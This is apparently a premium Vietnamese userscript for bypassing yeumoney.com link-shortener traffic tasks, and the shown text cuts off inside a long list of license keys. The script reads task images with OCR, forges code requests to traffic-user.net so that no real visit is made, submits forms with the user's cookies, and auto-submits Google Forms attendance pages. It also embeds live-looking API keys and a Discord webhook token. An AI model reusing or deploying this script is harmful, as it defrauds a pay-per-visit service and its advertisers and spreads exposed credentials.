    const GET_VUATRAFFIC_URL = "https://traffic-user.net/GET_VUATRAFFIC.php";
    const GET_MA_URL = "https://traffic-user.net/GET_MA.php";
    const GOOGLE_URL = "https://www.google.com/";
    const OCR_URL = "https://api.ocr.space/parse/imageurl?apikey=K81664733488957&isOverlayRequired=true&OCREngine=2";

    function doiNhiemvu() {
        console.log("Đang đổi nhiệm vụ...");
        const btnBaoloi = document.querySelector('#btn-baoloi');
        if (!btnBaoloi) return;
        btnBaoloi.click();
        setTimeout(() => {
            const reasonLink = document.querySelector('#lydo_doima > center > a:nth-child(2)');
            if (reasonLink) reasonLink.click();

            setTimeout(() => {
                const radioInput = document.querySelector('#lydo_doima > label:nth-child(8) > input[type=radio]');
                if (radioInput) radioInput.click();

                setTimeout(() => {
                    const confirmLink = document.querySelector('#dongy_doima > a');
                    if (confirmLink) confirmLink.click();
                }, 500);
            }, 500);
        }, 500);
    }

    function recognizeTrafficURL() {
        return new Promise((resolve, reject) => {
            const trafficName = document.querySelector('p#TK1').textContent.trim().toLowerCase();
            const imageElement = document.querySelector('img#halt_nv') || document.querySelector('img#hinh_nv');
            const imageUrl = imageElement ? imageElement.src : null;
            if (imageUrl.includes('placehold.co')) {
                setTimeout(() => {
                    recognizeTrafficURL().then(resolve).catch(reject);
                }, 100);
                return;
            }
            const fetchUrl = `${OCR_URL}&url=${imageUrl}`;
            const xhr = new XMLHttpRequest();
            xhr.open("GET", fetchUrl, true);
            xhr.onload = function() {
                if (xhr.status === 200) {
                    const response = JSON.parse(xhr.responseText);
                    const parsedResult = response.ParsedResults[0];
                    const result = parsedResult.TextOverlay.Lines
                        .filter(line => line.LineText.match(/\b[a-zA-Z0-9-]+\.[a-zA-Z0-9-]+\b/) &&
                            line.Words &&
                            line.Words.some(word => word.Top < 170))
                        .map(line => line.LineText);
                    let taskURL = '';
                    if (trafficName === '188bet') {
                        taskURL = `https://165.22.63.250${result}/`;
                    } else if (trafficName === 'w88') {
                        taskURL = `https://188.166.185.213/`;
                    } else if (trafficName === 'bk8') {
                        taskURL = `https://188.166.189.40/`;
                    } else if (trafficName === 'fb88') {
                        taskURL = `https://fb88${result}/`;
                    } else if (trafficName === 'm88') {
                        taskURL = `https://bet88${result}/`;
                    } else if (trafficName === 'vn88') {
                        taskURL = `https://139.59.238.116/`;
                    } else if (trafficName === 'v9bet') {
                        taskURL = `https://v9bet${result}/`;
                    } else {
                        taskURL = `Chưa nhận diện được URL!`;
                    }
                    resolve(taskURL);
                } else {
                    reject('Lỗi khi tải dữ liệu: ' + xhr.status);
                }
            };
            xhr.send();
        });
    }

    function generateTimestampData(taskURL) {
        const timestamp = Date.now();
        return `${timestamp},${GOOGLE_URL},${taskURL},IOS900,hidden,null`;
    };

    function fetchCodexn(ymnclk) {
        return new Promise((resolve, reject) => {
            const timestampData = generateTimestampData();
            const xhr = new XMLHttpRequest();
            const fetchUrl = `${GET_VUATRAFFIC_URL}?data=${timestampData}&clk=${ymnclk}`;
            xhr.open("POST", fetchUrl, true);
            xhr.onload = function () {
                if (xhr.status === 200) {
                    const htmlString = xhr.responseText;
                    const codexn = htmlString.match(/localStorage\.codexn\s*=\s*'([^']+)'/)?.[1];
                    if (codexn) {
                        localStorage.codexn = codexn;
                        resolve(codexn);
                    } else {
                        console.error("Không thể lấy mã codexn");
                        reject("Lỗi! Đổi nhiệm vụ khác và thử lại");
                    }
                } else {
                    reject(`Lỗi: ${xhr.status}`);
                }
            };
            xhr.onerror = () => reject("Lỗi mạng hoặc yêu cầu không thành công");
            xhr.send();
        });
    }

    function fetchCode(codexn, url, loai_traffic, ymnclk) {
        return new Promise((resolve, reject) => {
            const fetchUrl = `${GET_MA_URL}?codexn=${codexn}&url=${url}&loai_traffic=${loai_traffic}&clk=${ymnclk}`;
            const xhr = new XMLHttpRequest();
            xhr.open("POST", fetchUrl, true);
            xhr.onload = function () {
                if (xhr.status === 200) {
                    const htmlString = xhr.responseText;
                    const ymnclk = htmlString.match(/sessionStorage\.setItem\("ymnclk", (\d+)\)/)?.[1];
                    if (ymnclk) {
                        sessionStorage.setItem("ymnclk", ymnclk);
                        resolve(ymnclk);
                    } else {
                        const doc = new DOMParser().parseFromString(htmlString, 'text/html');
                        const spanElement = doc.querySelector('span#layma_me_vuatraffic');
                        if (spanElement) resolve(spanElement.textContent.trim());
                        else reject("URL Lỗi! Vui lòng kiểm tra lại.");
                    }
                } else {
                    reject(`Lỗi: ${xhr.status}`);
                }
            };
            xhr.onerror = () => reject("Lỗi mạng hoặc yêu cầu không thành công");
            xhr.send();
        });
    }

    function fetchResult(code) {
        const actionValue = document.querySelector('#gt-form')?.getAttribute('action') || '';
        const url = `https://yeumoney.com${actionValue}`;
        const formData = new FormData();
        formData.append('code', code);
        formData.append('keyword', '');
        formData.append('dieuhanh', document.querySelector('input[name="dieuhanh"]')?.value || '');
        formData.append('pix', document.querySelector('input[name="pix"]')?.value || '');
        formData.append('lvp', document.querySelector('input[name="lvp"]')?.value || '');
        formData.append('ref', '$ref');
        formData.append('trinhduyet', document.getElementById('trinhduyet')?.value || '');
        formData.append('id_traffic', document.getElementById('id_donhang')?.value || '');
        formData.append('check_index', '1');

        const urlEncodedData = new URLSearchParams(formData).toString();

        GM_xmlhttpRequest({
            method: 'POST',
            url: url,
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': navigator.userAgent,
                'Referer': 'https://yeumoney.com/',
                'Cookie': document.cookie
            },
            data: urlEncodedData,
            onload: function(response) {
                window.location.href = response.finalUrl;
            },
            onerror: function(error) {
                const errorFetch = error.error;
                const url = errorFetch.match(/https?:\/\/[^\s"]+/);
                window.location.href = url;
            }
        });
    }

    async function startBypass(url) {
        try {
            const codexn1 = await fetchCodexn(null);
            const url1 = url.replace(/\/$/, "");
            const ymnclk = await fetchCode(codexn1, url1, GOOGLE_URL, null);
            const codexn2 = await fetchCodexn(ymnclk);
            const url2 = url + "admin";
            const result = await fetchCode(codexn2, url2, url, ymnclk);
            return result;
        } catch (error) {
            console.error("Lỗi trong startBypass:", error);
            return null;
        }
    }

    async function fetchGoogleSheetHyperlinks() {
        try {
            const today = new Date();
            const day = today.getDate().toString();
            const spanElement =
                document.getElementById('docs-title-input-label-inner') ||
                document.querySelector('.docs-ml-header-document-title-text');

            const spanText = spanElement.textContent || spanElement.innerText;
            if (!spanText.includes("TÌM MÃ BƯỚC 2")) {
                const storedDate = localStorage.getItem("dayBypassed");
                if (storedDate === day) {
                    console.log("Đã bypass hôm nay.");
                    return null;
                }

                if (spanText.includes("BACKUP KHÓA HỌC 2K7 FREE")) {
                    const userConfirmed = confirm("Bạn có muốn Bypass không?!");
                    if (!userConfirmed) {
                        localStorage.setItem("dayBypassed", day);
                        return null;
                    }
                } else {
                    return null;
                }
            }

            localStorage.setItem("dayBypassed", day);

            const sheetUrl = window.location.href;
            const apiKey = "AIzaSyDTEFhPROUdMvEg7pTPF13rTRCfgXbJLJo";
            const sheetId = sheetUrl.match(/\/d\/([a-zA-Z0-9-_]+)/)?.[1];

            if (!sheetId) {
                console.error("Không tìm thấy Sheet ID.");
                return null;
            }

            const apiUrl = `https://sheets.googleapis.com/v4/spreadsheets/${sheetId}?fields=sheets(data(rowData(values(userEnteredValue,hyperlink))))&key=${apiKey}`;
            const response = await fetch(apiUrl);

            if (!response.ok) {
                console.error("Lỗi khi gọi API:", response.statusText);
                return null;
            }

            const data = await response.json();
            const sheetData = data.sheets?.[0]?.data?.[0]?.rowData || [];

            for (let row of sheetData) {
                for (let cell of row.values || []) {
                    const hyperlink = cell.hyperlink;
                    if (hyperlink && hyperlink.includes('https://yeumoney.com/')) {
                        return hyperlink;
                    }
                }
            }

            console.warn("Không tìm thấy hyperlink hợp lệ.");
            return null;
        } catch (error) {
            console.error("Lỗi:", error.message);
            return null;
        }
    }

    async function completeGoogleForms() {
        if (!document.title.includes("Điểm danh ngày")) {
            return null;
        }
        window.onbeforeunload = null;
        function clickCheckbox(checkbox, delay) {
            setTimeout(() => {
                if (!checkbox.classList.contains('checked')) {
                    checkbox.click();
                }
            }, delay);
        }

        function clickRadio(radio, delay) {
            setTimeout(() => {
                if (!radio.classList.contains('checked')) {
                    radio.click();
                }
            }, delay);
        }

        var checkboxes = document.querySelectorAll('div[role="checkbox"]');
        checkboxes.forEach((checkbox, index) => {
            clickCheckbox(checkbox, index * 300);
        });

        var radioGroups = document.querySelectorAll('div[role="radiogroup"]');
        radioGroups.forEach(group => {
            var radioButtons = group.querySelectorAll('div[role="radio"]');
            radioButtons.forEach((radio, index) => {
                clickRadio(radio, index * 300);
            });
        });

        setTimeout(() => {
            var form = document.querySelector('form');
            if (form) {
                form.submit();
            }
        }, (checkboxes.length + radioGroups.length) * 300 + 200);
    }

function createUI(taskURL) {
    const container = document.createElement('div');
    container.style.position = 'fixed';
    container.style.top = '10px';
    container.style.right = '10px';
    container.style.backgroundColor = '#f9f9f9';
    container.style.border = '1px solid #ccc';
    container.style.padding = '10px';
    container.style.zIndex = '9999';
    container.style.width = '350px';
    container.style.boxShadow = '0px 4px 6px rgba(0, 0, 0, 0.1)';
    container.style.borderRadius = '10px';

    const des = document.createElement('h4');
    des.textContent = 'Script By phantruong (premium)';
    des.style.margin = '0';
    des.style.marginBottom = '10px';
    des.style.fontSize = '10px';
    des.style.fontStyle = 'italic';
    des.style.textAlign = 'center';
    des.style.backgroundImage = 'linear-gradient(90deg, red, orange, brown, green, blue, indigo, violet, indigo, blue, green, brown, orange, red)';
    des.style.backgroundSize = '200% auto';
    des.style.color = 'transparent';
    des.style.backgroundClip = 'text';
    des.style.webkitBackgroundClip = 'text';
    des.style.animation = 'rainbowMove 5s linear infinite';

    const style = document.createElement('style');
    style.textContent = `
        @keyframes rainbowMove {
            0% { background-position: 0% 50%; }
            100% { background-position: 100% 50%; }
        }
    `;
    document.head.appendChild(style);

    container.appendChild(des);

const discordWebhookUrl = "https://discord.com/api/webhooks/1344001797597036677/-lit6XnywA4MqJE0_hvMUvhKCwATMoc0Zr5t3W-unseFNMMD51prJmbBW38Iu_bImh-o";

const keyTitle = document.createElement('h3');
keyTitle.textContent = 'Nhập Key Bypass:';
keyTitle.style.margin = '0';
keyTitle.style.fontWeight = 'bold';
keyTitle.style.marginBottom = '5px';
keyTitle.style.fontSize = '16px';
keyTitle.style.color = 'darkred';
container.appendChild(keyTitle);

const keyInput = document.createElement('input');
keyInput.type = 'password';
keyInput.placeholder = 'Nhập key của bạn';
keyInput.style.width = '100%';
keyInput.style.marginBottom = '10px';
keyInput.style.padding = '8px';
keyInput.style.fontSize = '14px';
keyInput.style.border = '1px solid #ccc';
keyInput.style.borderRadius = '5px';
container.appendChild(keyInput);

const validKeys ={
    "ewcQdxhRUBtjyQsNheoA": null,
    "YbwGjULxiqcUIvhTsewT": null,
    "chqghRcTvAiYjseBjXza": null,
    "oAgoPqoVaihw7MV4uZGP": null,
    "LiNgOcPxyucGEIbtnoJn": null,
    "GDsjOoQVvqxrbDBeTTfI": null,
    "hCPniDaMhJINjJBQknqk": null,
    "EUXULgATKaGlyGhFfJyq": null,
    "WuBcqtZXIVmiWDBHXSrS": null,
    "uIZrIFOBrLQtEnLCOgEs": null,
    "ulceVpvfnzJYpwRFETtt": null,
    "VtnDcmsRFDEteCkWYFRR": null,
    "FdFzomCHlcwtbDkISxYv": null,
    "NZmnInLoXvChidmyzUjR": null,
    "LJGrynJycjpepeNvUMot": null,
    "gqdMnkbqdcUsyRBGOATZ": null,
    "BjyCqCLyWqFrrvgTcnLR": null,
    "jxnsBAZGTIAtFeVJzQYO": null,
    "HJzMcaXYBQHLEESYIspa": null,
    "IykAsHxQCRhRTkDIOJiZ": null,
    "gmNENBkylhKxgbgiticQ": null,
    "HGiACDMdyFsNerUZvkYy": null,
    "knAsdxfHZwlSOANaiJyK": null,
    "HkUKFFeVhRoYecwPfZnQ": null,
    "VCDIzhPGcHjZYMfxCZkk": null,
    "NlmTSAUyQNWFFzpPxvfJ": null,
    "GzExPWxwDIPdSZYTYSBa": null,
    "wBFMngnslkbmBRjCoxST": null,
    "WhKsVkNhAuOsVhgPtUgM": null,
    "nUqdqyqSzXlQNkADPaPU": null,
    "lhcjAbSKajSFhHZZXzDW": null,
    "MJLXpOPWLJdyFxwxWGRn": null,
    "iGYqTdTbcdlaoNerHnqB": null,
    "YKIRfNKSBFGivocDfqkK": null,
    "AdtGfCGJzkqcuABfEHeY": null,
    "vHPEMUuyxNJTJODfEVCx": null,
    "JalzNlpPUrtbPagmtHeH": null,
    "nQWnoEeTKUYKWQjloydJ": null,
    "LaWYKSIZaSMcfHqEDVJi": null,
    "BRqXNtLJwHVZJDFVViTZ": null,
    "iyYtqtVWAxUIApltnrJZ": null,
    "CYPZpOFAGjzkCTknsxKF": null,
    "JAXmKJXBukuSCbsUCIGM": null,
    "CfgYOtFCzZFIvZmVjdll": null,
    "xxsysEJRFKembrJqYgHc": null,
    "ytaujPrtPZBMlFOCxiZB": null,
    "wNwPkLvdfsuDDCzPuZFF": null,
    "sgCqImFVrCcFHRcZzlSw": null,
    "jeyyxLSCdxvCPmlSyjpQ": null,
    "EiGiiNgOjIafRiWfodKS": null,
    "eKswcKvOccptgCmNgxAA": null,
    "FiXqaLpPolhqewsuelNH": null,
    "wCZAwIbxtZVfbIWeXBQF": null,
    "PfyKSIQakTlfYvMrYtZh": null,
    "HrZNWVQuDllQBlaTVdHg": null,
    "KgtIariFrLGADNeDUPuk": null,
    "IrqcdbABnYReTnNcpcUC": null,
    "moghdgklCKRYNhYkMtvd": null,
    "zSDFWsQMtZPPqjOmRFaG": null,
    "aBpqIhAfeFyubNhHGtkK": null,
    "FsldbCdqtUoXcNzMizer": null,
    "lwTguSTbrpihyavpfELm": null,
    "pHLmAnElOzWHwCWFlQVD": null,
    "NVvLMvOJzlLmpUSgyNdV": null,
    "dVlReZlExnyszpnErCVc": null,
    "FONwIfkbyCZBvUOXCpAC": null,
    "XvXXpfJvJfdFaxPziMYI": null,
    "UDBYASUULVtdArCXseaV": null,
    "aIQlCqjSKWMkdWIVLbAb": null,
    "PNaBZXSmzrGMtJySUxkI": null,
    "EgcKnlkHbpZgOwPDYjjJ": null,
    "DxyCPfWqAdzcjENbleEQ": null,
    "mouESThvLoqdVAWeJRpJ": null,
    "ssTxeoVdlmgGHaCCXcSX": null,
    "WStwacLcUOIsZSpsaaGO": null,
    "GJptCeBkkqiBIfofIwPQ": null,
    "uIRMqqKTNSgSTNaZYUpD": null,
    "VzkqvPBjmpqVsMHHsYRs": null,
    "jdSqzvqntrXXgiViuuMS": null,
    "bmQugvjeNzmGGYhVwyGw": null,
    "iVRsvEjZflWqHfOUGXnE": null,
    "iyWlieAqYRljwWnaKoHR": null,
    "RDoquWUVrfpcCazdTwaK": null,
    "DZYAmjxfIksFIFdXbtOO": null,
    "asLSsRIbSNCUsATKajOQ": null,
    "qkOYwuQWygwQzIVAKFfC": null,
    "ccGFZedKOTpiEIEQqnfQ": null,
    "LePsLCriZbsuEVanIoMi": null,
    "yBfHTdYVjMvlxRcpDLVv": null,
    "YJFHDnRCiquzcpeamyad": null,
    "zvDsvYlDEmUJHjfYzYyU": null,
    "EKqEZEHyRALdrzJKAhcL": null,
    "cLEzovfGSooqqcYeGOTZ": null,
    "UouzfsbXUiDUXZqTkJoP": null,
    "dTbfeHVjnkiUKjyRMvDC": null,
    "AFXFDZizOtBdePfYKlVv": null,
    "ajJfCEzwEJetANdyocys": null,
    "obkRAMgLmilbpIANTbaN": null,
    "lKaRKtsccREADkkxVNWU": null,
    "AKAFpKYTdrifSbSQWohm": null,
    "TbuCjczBYSYPCJfwJlGl": null,
    "lQZAnmMXOmVSuOBobDXT": null,
    "LUYYrVxkdVLVxjFEJgJP": null,
    "zrfFUzZvGmFVBVEIqGqu": null,
    "jVnkbAQEfRcOSZPHoREO": null,
    "vzWGlQmHPzkBGObSOkMI": null,
    "ycOeKRnpXgXtHGcNhOpu": null,
    "VFrlWrgHTJGPSZnvKgbo": null,
    "CylkSseTVaGvCFaPmyRF": null,
    "oYPFcSLmUpiOwfYrVTcp": null,
    "KdbiwZOuZkHvMzBkRUji": null,
    "fSolFfXRvbTdqtuIrRCH": null,
    "HKhPDgXHKqvmmCFSgwsR": null,
    "cAloGUdYbMAmUBwIMEGH": null,
    "qOHOuDYCCgzKevdXGNLj": null,
    "KUJAWqJGRqgIbMsMxVhr": null,
    "nMREXNMQeOVcXcjoDOYH": null,
    "KVrZfaikOTfzZquVkPtW": null,
    "FRMHOjofBEZmzlwIYtHO": null,
    "YZUBBLHOeZYUgoOMQrLv": null,
    "MHcadowieKabReJlbKqe": null,
    "coxYxoCKwDKMgYCpyjzL": null,
    "WaxZyoddvTUMYxypxzRN": null,
    "nfYBoKSuMJoEUnPdNeuF": null,
    "ycTgrsBUANYQatyTwRTS": null,
    "kQlZYuyvlWiWSXZQkQIQ": null,
    "UGxXrvdiCDXuXhVNZPvc": null,
    "HexEbFApWRkXxdaOVWEZ": null,
    "AGiCcfHIokSKrnRgzrja": null,
    "ZBhNYGxILdqcnCZqFtEG": null,
    "XALeqAWMzrMVGMAHfoao": null,
    "xwxzHAFDtkwuZOnPNVBd": null,
    "kIilbGJbsZBXtLQLuJRG": null,
    "GcddGrcCEMsxoCkkZrte": null,
    "KEOSJdVzdXGdDckwDvOZ": null,
    "TAzGYVFCafQCnWhBFkly": null,
    "TIAIjIPoABfkLncWBJWd": null,
    "hDkLKQfRoqRemEmwhvpQ": null,
    "GZIXXothVzUNuJTmtBiN": null,
    "TUtGEeRwqjnBwTeXjlUP": null,
    "DUmNfKoqdEuTzpBiaRMZ": null,
    "YlRJWNuByDUVoRFCJamV": null,
    "bTIbKWZIUVZPmCArrmRC": null,
    "IfdaxSFtZfctrXSiUlmk": null,
    "gbcFGOHtliqhPSOJjMry": null,
    "KpKMpIoNUBbuatgjVPEm": null,
    "XrqezmiumHukmoPCpsTb": null,
    "pQGkSgeKlnkazwWIkniU": null,
    "sWNTdXHBvfwgpmQAFunU": null,
    "ziwKvwruqIeMFURFLhiM": null,
    "tuCojDqaEHBIWfzGvqHK": null,
    "HDJPQZsvBiQaZaYeKVZg": null,
    "iNeXurBYFMUOMbGwRUXC": null,
    "OSjVLbeVwOZOkmYBsouN": null,
    "gEMAEduhJnkmUdDKuTRy": null,
    "tncBvhaJCnSeTeIccbte": null,
    "wxEIxMHlNxEQhztEKMhl": null,
    "MwWUZXwEsPNGyzKeWtji": null,
    "XmNXemzrEaasdUqELpvd": null,
    "ZfjKswtYRnQZEPpVQSiI": null,
    "IHcHjMZanWMhywYmtLwV": null,
    "GMwFgXsYcYmOYhGqapkP": null,
    "lelGexyjQPvGaIbyiKdC": null,
    "ayrurajqHPTWkCqXAxJX": null,
    "ZjeXDCjaWccTCgSknOrh": null,
    "rfKHPQiCzmoJmhMyaxyf": null,
    "klUjIOxELkRJOrhaxiNF": null,
    "HPDlTAymSdPoqYdFMiXn": null,
    "hBKkGanLQByeBcEmkEZP": null,
    "jzfFkNaMubGfDoWlEsMm": null,
    "xygQLnEHMEJoGGcidCTn": null,
    "lqtjhAvNrCFEHJpSSywp": null,
    "uxxnSLUybVzkiuLuOXfQ": null,
    "AKkPXNRPCpQTmiizjiHm": null,
    "zKNkbJGqQLSOphvLcIqL": null,
    "frvKmOuEpfZgxkYpiKdd": null,
    "qIHzWjmbHCmtyMYlQvnm": null,
    "crASinPSoJUMFBpVLWKI": null,
    "IZFghZmYyagGaKdDcZUz": null,
    "bkXMWRFNGPONAMVLoPsw": null,
    "IkfXXZxkpfJYoFGCzIIM": null,
    "ubCKTXRtBCbkoNtJOMXt": null,
    "DiwdxCUPZbXUcetlHOsQ": null,
    "DIDslNKLdgBxdyitTxDT": null,
    "OXYJMnMozFXSBNWJBFGa": null,
    "gUnfizpLaYcWlyVCJMMs": null,
    "gkorLSETWdfbhvImxAPg": null,
    "UVLgecguGzvYetqWPVAj": null,
    "xSWTBDeiDlhOxahyhQcI": null,
    "pmREqEcXfHnlQqKcGFkQ": null,
    "WTlPpQwdMyrOxuTmpKAw": null,
    "JGSmbWyVvHveyJxmZmim": null,
    "cAlkmqBCKlQkQyxVCcaw": null,
    "XoKIITMBQiJXOWBGdTNr": null,
    "dogowyfnsvoIoaMRTiPI": null,
    "bQthcMbeMBEfDhFdlmrZ": null,
    "UFSZijcywhkGSdaUHCil": null,
    "uWVhtjbZNHabmXaDPXAY": null,
    "ZXPQJwjWNeRmColURWkr": null,
    "iOylCMqdeladQSOwXfet": null,
    "ZMIGcjPIVmeRSfqQcYXV": null,
    "UwEqNTnpXuRGnGSdrQyJ": null,
    "TZUzmaRdQJMcLkmdyVXj": null,
    "HjMGSpxRufprZAepFYTL": null,
    "xompEEYufPyupcplMwCu": null,
    "CtFejNfalKAuMERvxGnD": null,
    "vecjGTtmFEaxFbZhXdYh": null,
    "hNbmJJAijZUHPoyhfpQX": null,
    "iWpjJyjCKpaQKSOCPhNe": null,
    "DVOGPYehpYAOFbMdpzIZ": null,
    "YvNgHzNXiMZpIFHjwDQJ": null,
    "DIcFqLoSHTQBwJLHxndV": null,
    "mRUbDKMcQxjKcVTWzyHx": null,
    "wVEDgougdufNggrlxivl": null,
    "gmhjUDTLlsRZDayOnNKr": null,
    "rNxxALiNofEeLjQFLgfK": null,
    "blQEWvoYUmirpSSuctDA": null,
    "rJvRxiXxckdaSZzjvTyw": null,
    "UedKuyxdIBKHOgkuvvsN": null,
    "kIiPFwrICHfYPWNHxgjH": null,
    "bGVXDKboNxHHReHxxJhh": null,
    "RadBrRYcXMdNbcawEUzV": null,
    "JmnNwRvcAeRKGlydikWa": null,
    "HcUkgKEMpVJzztgrGpMs": null,
    "YIKHxmznEnyEPcuiyWwN": null,
    "VVLovIkWGmRJpkPEwIYa": null,
    "JYBKuXlgXNWcNKMipcYe": null,
    "RRCdflZVtvuWXRjVWDrb": null,
    "SGjPsipgOEFVCsLXNXRf": null,
    "SlvbxZzmTbGVpfgaotER": null,
    "oygUazrCUDRHdiyLKbBm": null,
    "VTLMenVxwMfLkhydIRdO": null,
    "FqQFkjHmvzQjxYNKpILu": null,
    "AlqODChEzIWIddbUzCVr": null,
    "SyTVQEyLJiKvaPZFlUSM": null,
    "nviSczykECZSdixDbVBW": null,
    "EUTTehCwXYNXalkDaWOU": null,
    "AJkEZSmpZSFtUdBIOoZD": null,
    "TKwuHUhxuXgmfMfbcYTf": null,
    "tNggPKDnZbCeweESXCPv": null,
    "XjFMIhJgAsnZeXERhvxN": null,
    "RecAuCjvxLcclopfkReb": null,
    "hcJAmixrrzROgbbAMQkK": null,
    "iKEpFGqlsXDdpLHwGtLe": null,
    "PQUdztXipndTYFtufiBu": null,
    "iAxCUHJmzyEJZobCmoDq": null,
    "EHHvdKqQgJwdThVQBlXx": null,
    "NjxgBVizfJrIamvtitKp": null,
    "JBGTPnjelmMcMEDffRLC": null,
    "IYNQNBVDzpysrpOwmwUH": null,
    "zEjfxhYAKrqECKQrybHc": null,
    "PubaQDdvZxRvNyUqTIzl": null,
    "cfpDHSPVQWYwThAGTThI": null,
    "GBkbShlmrmGgklidkyRq": null,
    "nhwZQhMThBjDpiNmkoWD": null,
    "ImWwvjRgfjweQsifNfco": null,
    "xPRDMITkcwYDSAWqDSUy": null,
    "SVCGopwaMdPsTkzNDdJY": null,
    "hTDdwRFOwwCpEDXGBuRF": null,
    "NHHygJyqHhzylaqrBLWW": null,
    "DwbcOVTyyRQvVIUwnZvK": null,
    "qvRbjaFzgXzKIgwMsXgd": null,
    "visIUhEoUgLlGPWGhhSJ": null,
    "tRCtXnOKeMdXSaSaqLzE": null,
    "hBKZffioWDPlrYvGefBq": null,
    "bwhcgAQvqtAwsIeoEwgC": null,
    "ChmYheRGHdbIEVLgjxEj": null,
    "LdfrAVfsRWBZENjgPtgY": null,
    "aBjOQgaSGgypgpajXNbb": null,
    "hRykzYwSyVPiaFJlNsOd": null,
    "YxsAlejjmbyRCwUJTLhI": null,
    "xfeOHIYnpQQDEobNxfiX": null,
    "xcjINsKeZFrUnczgPEFy": null,
    "wUaRwhwHABnAPyXjOSbM": null,
    "KwPxuGzdSbzabCKydQon": null,
    "zdPoFNOfwOHCUdZxyeOn": null,
    "wQgXKRToIuNUyluALGKC": null,
    "RaWEwguPpTEQlYCVEzIf": null,
    "YvxkPhHofBLDEosqJYBU": null,
    "EmZDKAIlUuPzZJOgwhZz": null,
    "FxoqqxivdFVebFyqfXIb": null,
    "BgrOfHJVqEvEbdpwwRTc": null,
    "WbzfGxBSQxEFMeQFgZWj": null,
    "iZfIxERccuoveXzzKUtd": null,
    "zPhDvkDDPjkjGKHLrksJ": null,
    "HmaqfhzsbPJzmihuJtEX": null,
    "TlCNDcShtHHMXLpeIJUk": null,
    "EAwESpuqYMlslKJDOAyN": null,
    "YctOmybQbnnSLzukUUzt": null,
    "xSKbemZiUOevAvanlCQJ": null,
    "ZTidlVtgwSUZyGThduEc": null,
    "PilHDKFrTaylfVyaKHQt": null,
    "SbwMXgAdqjFTGsnClnnw": null,
    "EBXDwVChtXwZFqTnQlnw": null,
    "PyNIXgPstvYPzbquJXiN": null,
    "wePgSWcqarfkYLjxkmgf": null,
    "wLgxUkLHjfHPhMQexWyc": null,
    "yvmhklMTQlcEPRbjNxOF": null,
    "kQqSopIRmFfxLmoUUMgl": null,
    "FSNEUyiiYbCqOQOwtYCY": null,
    "rHjMWxXYCEkvesdVUCkA": null,
    "GegJQIFXEPmGSnFjQaek": null,
    "HyRZfPZOeNndLuxJaplE": null,
    "pvdRgTQQnsrrKKdFFlrw": null,
    "ijEiPWGjhdEyszNPqzuY": null,
    "cEyNyoauHwEDrOklPKoo": null,
    "RaMJkDrQUnwjheGKfmvx": null,
    "FerINjPwHpmWKlYZGkUC": null,
    "rFMRMjyfwrrZaXDYzIxP": null,
    "KGgDdoWaoXquoCnpSTAc": null,
    "FzEBCIMnFapumAehlqCH": null,
    "GjaQFQQZkhbRQsUuIqzl": null,
    "YwmkClvEQisegcjvDfdo": null,
    "lROsgJQqrApSMQtCqqAv": null,
    "AIVCipZacTbyiXJOeAOa": null,
    "UMhXeMEqZrcYLKrebiKF": null,
    "SrlZWCevsRaLQbHSlunm": null,
    "dtpMLqaYnuAizmEvnkxQ": null,
    "kdWvHzdSMQgXNpdOdyRZ": null,
    "qBzeXvTlonnjmaVvAYGX": null,
    "gSCwtvGHHsDUdtRIOtqr": null,
    "JbFLwwdTFQnhmVqbLJCR": null,
    "wZhYBiATCffRwaXSRHhf": null,
    "drXeDWQnpvOMFfzHRlBg": null,
    "NvhMAkMwAWHPCISjpxQW": null,
    "hwwijrGYzZMmTPgIrttZ": null,
    "devgWcWWNvieilxxWnry": null,
    "zhiFVCBbKqGlsesHkpMF": null,
    "JMfEMgiqsIYYRaHMSjoX": null,
    "pQkPtWDubdawkihYpxdc": null,
    "QkeuPDWdASbOXJXwSeKZ": null,
    "LMzgnbxiGUTTildlaTrA": null,
    "XWNHUFGPvENsbZSzfnEL": null,
    "jelMArDQFHFaIHTCHsHK": null,
    "NQkcRmXrfDYiGsTTUyVO": null,
    "uqqLaGbWEVYavMwwZSXf": null,
    "uaqeKiJGfTgINWlzXNyw": null,
    "KKGUZBIzillrRBQbCGxY": null,
    "yewzsqCEHJNPDnsuEDts": null,
    "VbGXareBvdqDKAcVLvUt": null,
    "xrjykgOyJsGYJSEaKVCh": null,
    "VbIFWorBQXcKvFhWwDlA": null,
    "VdhTuCfJNJRYMDiEqpAd": null,
    "oJkumisgyyNWbPBuHnmF": null,
    "XccLMSLJqnCKnYXBhdSX": null,
    "cwibllfKXrHrHQRKaOkz": null,
    "hNxvFOobcMvtxDhvfbjD": null,
    "LzkkkCCpujMdTzTimlrn": null,
    "bmFhsluFsZIjuVvufIqu": null,
    "SSLaADyRPyOkBkvvbCTT": null,
    "NkKNiofuSemgwYddMVTC": null,
    "efubMCwgfelTinBEJlGA": null,
    "jNrxDBrgmblWVbhwGNIT": null,
    "LCeLayZOyKidFEroNbbD": null,
    "PJDFSsTWwxYYRDeYOBJN": null,
    "xXCwmHMMONWfDDIAhBHo": null,
    "LuHlaoouOxeKmCXzlZsG": null,
    "AcHPkNfWCbGhXMkNxpJS": null,
    "jwAbmgYifSSnCEckhRqM": null,
    "hzwvhCPkaZjNpJTZYHMY": null,
    "NfoOsGFOhaXzTSqkDiNp": null,
    "XwZEulTNCsWeNTZqETuV": null,
    "BCsNgqHczbwcilZRPlVD": null,
    "MgkpJhbheqcmqwmkLCKW": null,
    "iXlkfnAWQbxDEDItNuEr": null,
    "VChoVYrlfCXIiIAhTkmK": null,
    "zEZfNUzHYMUMzyvkIcEN": null,
    "QTEExVRUuVJirohuXOcm": null,
    "GDFKFiNGWrDpyqyhFpzH": null,
    "ALkoaCwZiTESOqhGwTgj": null,
    "QPFUqZxgMAuUgVXrtJKc": null,
    "lDvhMggiTlOyqQBqgYlk": null,
    "juedWtBaapMjDciylVmd": null,
    "HxaTruLvZRIKOEqZCnJj": null,
    "SaMpigIWzABPcsvORIdK": null,
    "fUFnUSvrlgPnevFoBzVt": null,
    "amofOyRcXfggVCIXEZcf": null,
    "ULAmrEnRNEewcusbAbzv": null,
    "YdJyRzpvfmQXMHqoAkXB": null,
    "RlmpiOQujiLpctBaZVkp": null,
    "mAwmXcUhGltAvAvbKjCJ": null,
    "uodknyPbbJDNRfGyYiEN": null,
    "nIBapjocVgwbSoLkuCVR": null,
    "ylUNotKtlayalCKaqfWh": null,
    "ECKQHDcmYPjMIcygkguM": null,
    "UodqoZMOYahiRSYmlHgh": null,
    "pzlicuyrgusnlOavUCQx": null,
    "dBemgINTvDRDDkKlEQyl": null,
    "iiFOwYmjKKHOMOhvEKBV": null,
